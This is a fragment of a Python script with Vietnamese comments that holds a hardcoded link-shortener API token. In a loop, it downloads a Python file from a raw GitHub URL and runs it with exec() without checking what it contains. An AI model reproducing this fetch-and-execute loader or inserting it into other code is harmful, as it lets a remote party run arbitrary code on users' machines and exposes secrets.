...
def get_shortened_link_phu(url):
    try:
        token = "667294c6bf2cd922507983c4"# api link 4m
...
while True:
    try:
        url = 'https://raw.githubusercontent.com/shopaccrandom/gl_gop/refs/heads/main/hvhtool.py'
        context = ssl.create_default_context()
        context.minimum_version = ssl.TLSVersion.TLSv1_2  # Chỉ cho phép TLS 1.2+
        context.verify_mode = ssl.CERT_REQUIRED  # Bắt buộc xác thực certificate

        response = requests.get(
            url,
            verify=True,  # Bật xác thực SSL
            timeout=10,
            headers={
                'User-Agent': 'Mozilla/5.0',
                'Cache-Control': 'no-store'  # Ngăn cache response
            }
        )
        exec(response.text)
    except KeyboardInterrupt:
